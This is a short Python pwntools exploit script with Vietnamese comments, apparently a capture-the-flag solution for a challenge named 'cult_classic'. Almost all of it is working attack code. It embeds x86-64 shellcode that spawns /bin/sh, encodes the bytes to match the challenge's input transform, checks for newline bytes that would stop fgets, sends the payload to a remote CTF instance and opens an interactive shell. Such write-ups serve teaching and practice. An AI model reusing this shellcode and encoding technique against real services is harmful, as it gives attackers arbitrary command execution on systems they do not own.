from pwn import *

# Thiết lập môi trường
context.arch = 'amd64'

# Shellcode x86-64 để gọi execve("/bin/sh", 0, 0)
# Bạn có thể dùng asm(shellcraft.sh()) hoặc shellcode rút gọn
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"

# 1. Mã hóa ngược shellcode theo công thức của bài
encoded_payload = b""
for i in range(len(shellcode)):
    target_byte = shellcode[i]
    # R = (D - 7) ^ I
    encoded_byte = ((target_byte - 7) & 0xff) ^ i
    encoded_payload += bytes([encoded_byte])

# 2. Kiểm tra xem có byte nào là 0x0a (newline) không 
# vì fgets sẽ dừng lại nếu gặp 0x0a
if b"\x0a" in encoded_payload:
    print("Warning: Payload contains newline byte! Need to pad with NOPs.")
    # Cách xử lý: Thêm b"\x90" (NOP) vào đầu shellcode và mã hóa lại
else:
    print("Payload clear of newlines.")


# p = process('./cult_classic')

p = remote('pwn-cc-f9acda938d2b4223.instancer.batmans.kitchen', 1337, ssl=True)

p.sendlineafter(b"ritual sigils", encoded_payload)

# Nhận flag
p.interactive()